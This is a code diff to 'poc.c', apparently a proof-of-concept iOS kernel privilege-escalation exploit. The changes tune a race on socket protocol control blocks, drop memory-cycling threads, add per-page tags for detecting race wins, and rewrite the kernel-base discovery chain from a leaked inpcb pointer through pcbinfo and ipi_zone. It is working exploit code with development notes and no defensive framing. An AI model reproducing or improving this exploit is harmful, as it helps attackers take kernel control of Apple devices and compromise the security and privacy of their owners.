@@ -1,5 +1,7 @@
 // poc.c
-// Lumina P007OpenOnly - 64788 KRW Focus V24
+// Lumina P007OpenOnly - 64788 KRW Focus V25
+// V25: OG ClearSwordCore gates restored (w==-1 + Q0-only), per-page tags,
+// SO_NECP 0x1109, OG kbase ladder, cycler/churn removal
 // V44: Anonymous VM cycler (replaces IOSurface cycler), removed mlock
 //
 // V43 used IOSurface cycler which cycles PurpleGfxMem (Pool 2)
@@ -60,69 +62,13 @@ kern_return_t pe_init(void) {
     return KERN_SUCCESS;
 }
 
-// V43: Anonymous VM cycler — cycles the SAME physical pages the race reads
-static void *vm_cycler_thread(void *arg) {
-    (void)arg;
-    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
-    
-    while (churn_go) {
-        // Allocate and immediately deallocate anonymous memory
-        // This cycles physical pages in the SAME pool as the search mapping
-        for (int i = 0; i < 16; i++) {
-            mach_vm_address_t addr = 0;
-            mach_vm_size_t sz = 0x4000;  // 1 page
-            
-            kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, sz,
-                                                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
-            if (kr != KERN_SUCCESS) continue;
-            
-            // Write a pattern so we can detect if this page gets reused
-            memset((void *)addr, 0x41 + i, sz);
-            
-            // Immediately deallocate — physical page returns to free pool
-            mach_vm_deallocate(mach_task_self(), addr, sz);
-        }
-        usleep(50);  // Fast cycling
-    }
-    return NULL;
-}
+// V25: the V43/V44 anonymous VM cyclers and the socket churn thread are
+// REMOVED (OG launches only the free_thread). The cyclers exhausted the very
+// pools the race depends on — the sprayed PCB zone is the only churn now.
 
-// V44: Second VM cycler with larger allocations
-// Cycles multi-page allocations to stress the physical page allocator
-static void *vm_cycler_large_thread(void *arg) {
-    (void)arg;
-    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
-    
-    uint64_t cycled = 0;
-    
-    while (churn_go) {
-        // Allocate larger chunks (64KB = 4 pages)
-        // This forces the allocator to find contiguous physical pages
-        // which churns the free pool more aggressively
-        mach_vm_address_t addr = 0;
-        mach_vm_size_t sz = 0x40000;  // 256KB = 16 pages
-        
-        kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, sz,
-                                            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
-        if (kr != KERN_SUCCESS) {
-            usleep(100);
-            continue;
-        }
-        
-        // Touch all pages to ensure they're allocated
-        for (uint64_t off = 0; off < sz; off += 0x4000) {
-            *(volatile uint64_t *)(addr + off) = 0x42424242;
-        }
-        
-        // Deallocate — 16 physical pages return to free pool at once
-        mach_vm_deallocate(mach_task_self(), addr, sz);
-        cycled++;
-        usleep(100);
-    }
-    
-    LOG("vm_cycler_large: cycled %llu chunks (%llu pages)", cycled, cycled * 16);
-    return NULL;
-}
+// V25: the V43/V44 anonymous VM cyclers and the socket churn thread are
+// REMOVED (OG launches only the free_thread). The cyclers exhausted the very
+// pools the race depends on — the sprayed PCB zone is the only churn now.
 
 kern_return_t pe_v1(void) {
     uint64_t search_mapping_size = 0x1000 * vm_page_size;
@@ -136,10 +82,6 @@ kern_return_t pe_v1(void) {
 
     uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};
     size_t target_inp_gencnt_count = 0;
-
-    // V44: Declare cycler tids BEFORE the loop
-    pthread_t vm_cycler_tid = 0;
-    pthread_t vm_cycler_large_tid = 0;
 
     int outer_loop = 0;
     while (!cs_expired() && outer_loop < CS_MAX_OUTER_LOOPS) {
@@ -171,18 +113,6 @@ kern_return_t pe_v1(void) {
         LOG("start_pcb_id: %#llx", start_pcb_id);
         LOG("end_pcb_id: %#llx", end_pcb_id);
 
-        churn_go = 1;
-        pthread_t churn_tid;
-        pthread_create(&churn_tid, NULL, churn_thread, NULL);
-        LOG("socket churn thread started");
-
-        // V44: Start anonymous VM cyclers (NOT IOSurface cyclers)
-        // These cycle the SAME physical page pool the race reads from
-        pthread_create(&vm_cycler_tid, NULL, vm_cycler_thread, NULL);
-        LOG("VM cycler thread started (anonymous, 1-page)");
-        pthread_create(&vm_cycler_large_tid, NULL, vm_cycler_large_thread, NULL);
-        LOG("VM cycler large thread started (anonymous, 16-page)");
-
         bool success = false;
         for (size_t s = 0; s < n_of_search_mappings; s++) {
             if (cs_expired()) break;
@@ -193,8 +123,15 @@ kern_return_t pe_v1(void) {
                 continue;
             }
             
+            // V25: per-page unique tags (CSRaceCalib PAGE_ID law) instead of the
+            // shared random_marker. A torn/partial race copy is now attributable
+            // (page_idx in the tag) and no page contents echo the marker, so the
+            // Q0-!=marker win test in phys_oob can no longer fire on our own
+            // staged bytes.
             for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
-                memcpy((void*)(search_mapping_address + k), &g_ctx.random_marker, sizeof(g_ctx.random_marker));
+                uint64_t page_idx = k / vm_page_size;
+                uint64_t page_tag[2] = { 0xC0DEC0DE00000000ULL | page_idx, ~page_idx };
+                memset_pattern8((void*)(search_mapping_address + k), page_tag, vm_page_size);
             }
 
             LOG("looking in search mapping: %lu", s);
@@ -245,17 +182,6 @@ kern_return_t pe_v1(void) {
                 break;
             }
         }
-
-        // Stop churn thread
-        churn_go = 0;
-        pthread_join(churn_tid, NULL);
-        LOG("socket churn thread stopped");
-
-        // V44: Join VM cyclers
-        pthread_join(vm_cycler_tid, NULL);
-        LOG("VM cycler thread stopped");
-        pthread_join(vm_cycler_large_tid, NULL);
-        LOG("VM cycler large thread stopped");
 
         sockets_release();
 
@@ -333,16 +259,28 @@ kern_return_t pe(void) {
     // we have stable rw, we can close the fds now
     close(g_ctx.write_fd);
     close(g_ctx.read_fd);
-    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + g_ctx.offsets.inpcb_inp_socket);
+    // V25 FIX: the port read inpcb_inp_socket (0x40) here — OG walks the
+    // LIST (rw pcb -> list_next = the control pcb). The old code then used
+    // that socket POINTER as "pcbinfo_pointer" and indexed two reads through
+    // offsets.map_pmap, which offsets_init never sets (= 0), so the ladder
+    // indexed through +0 and returned garbage. OG iOS-17+ ladder:
+    // inpcb.pcbinfo (0x38) -> inpcbinfo.ipi_zone (0x68) ->
+    // kalloc_type_view.zv_name (0x10).
+    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + LUMINA_INPCB_LIST_NEXT);
 
     uint64_t textPtr = 0;
-    // iOS 17+ path (18.7.5): pcbinfo -> ipi_zone -> kalloc_type_view name
-    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_socket);
-    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + g_ctx.offsets.map_pmap);
-    textPtr = early_kread64(ipi_zone + g_ctx.offsets.map_pmap);
+    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + LUMINA_INPCB_PCBINFO);
+    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + LUMINA_INPCBINFO_IPI_ZONE);
+    textPtr = early_kread64(ipi_zone + LUMINA_KTV_ZV_NAME);
 
     uint64_t kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
+    // V25: bounded walk (OG lab law — kread-0 would spin forever)
+    uint64_t walk_tries = 0;
     while (!cs_expired()) {
+        if (++walk_tries > 0x4000) {
+            LOG_ERR("kernel_base walk exhausted after %llu pages", (unsigned long long)walk_tries);
+            return KERN_FAILURE;
+        }
         if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
             uint64_t typeinfo = early_kread64(kernel_base + 8);
 
